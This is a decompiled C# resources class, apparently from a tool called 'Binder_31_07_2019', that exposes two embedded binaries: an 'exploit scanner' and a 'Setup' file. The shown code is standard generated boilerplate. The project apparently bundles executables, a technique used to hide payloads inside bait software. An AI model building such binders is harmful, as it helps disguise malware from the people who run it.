using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace Binder_31_07_2019.My.Resources
{
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
  [CompilerGenerated]
  [DebuggerNonUserCode]
  [HideModuleName]
  [StandardModule]
  internal sealed class Resources
  {
    private static ResourceManager resourceMan;
    private static CultureInfo resourceCulture;

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager ResourceManager
    {
      get
      {
        if (object.ReferenceEquals((object) Binder_31_07_2019.My.Resources.Resources.resourceMan, (object) null))
          Binder_31_07_2019.My.Resources.Resources.resourceMan = new ResourceManager("Binder_31_07_2019.Resources", typeof (Binder_31_07_2019.My.Resources.Resources).Assembly);
        return Binder_31_07_2019.My.Resources.Resources.resourceMan;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Culture
    {
      get => Binder_31_07_2019.My.Resources.Resources.resourceCulture;
      set => Binder_31_07_2019.My.Resources.Resources.resourceCulture = value;
    }

    internal static byte[] Gr3eNoX_Exploit_Scanner_V8_0 => (byte[]) RuntimeHelpers.GetObjectValue(Binder_31_07_2019.My.Resources.Resources.ResourceManager.GetObject(nameof (Gr3eNoX_Exploit_Scanner_V8_0), Binder_31_07_2019.My.Resources.Resources.resourceCulture));

    internal static byte[] Setup => (byte[]) RuntimeHelpers.GetObjectValue(Binder_31_07_2019.My.Resources.Resources.ResourceManager.GetObject(nameof (Setup), Binder_31_07_2019.My.Resources.Resources.resourceCulture));
  }
}
